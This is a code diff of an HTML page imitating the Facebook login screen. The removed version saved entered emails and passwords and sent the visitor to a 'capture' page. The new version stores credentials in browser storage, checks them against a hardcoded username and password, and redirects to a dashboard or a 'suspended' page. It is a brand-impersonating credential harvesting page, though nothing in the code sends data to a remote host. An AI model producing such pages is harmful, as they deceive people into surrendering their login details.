@@ -1,12 +1,14 @@
+<!-- index.html -->
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
   <title>Facebook Login</title>
   <style>
-    body { font-family: Arial; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-    .login-box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 300px; }
-    .login-box h2 { color: #1877f2; text-align: center; }
-    input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #ccc; }
+    body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    .login-box { background: white; padding: 30px; border-radius: 10px; width: 300px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    h2 { color: #1877f2; text-align: center; }
+    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
     button { width: 100%; padding: 10px; background-color: #1877f2; color: white; border: none; border-radius: 5px; cursor: pointer; }
     button:hover { background-color: #145dbf; }
   </style>
@@ -14,25 +16,28 @@
 <body>
   <div class="login-box">
     <h2>Facebook Login</h2>
-    <form onsubmit="storeData(event)">
-      <input type="text" id="email" placeholder="Email or Phone" required>
+    <form onsubmit="handleLogin(event)">
+      <input type="text" id="username" placeholder="Email or Phone" required>
       <input type="password" id="password" placeholder="Password" required>
       <button type="submit">Log In</button>
     </form>
   </div>
 
   <script>
-    function storeData(e) {
+    function handleLogin(e) {
       e.preventDefault();
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
 
-      // Save to localStorage (temporary browser storage)
-      localStorage.setItem("email", email);
-      localStorage.setItem("password", password);
+      // Store the values
+      localStorage.setItem("storedUsername", username);
+      localStorage.setItem("storedPassword", password);
 
-      // Redirect to capture page
-      window.location.href = "capture.html";
+      if (username.toLowerCase() === "jin" && password === "synonym117") {
+        window.location.href = "dashboard.html";
+      } else {
+        window.location.href = "suspended.html";
+      }
     }
   </script>
 </body>
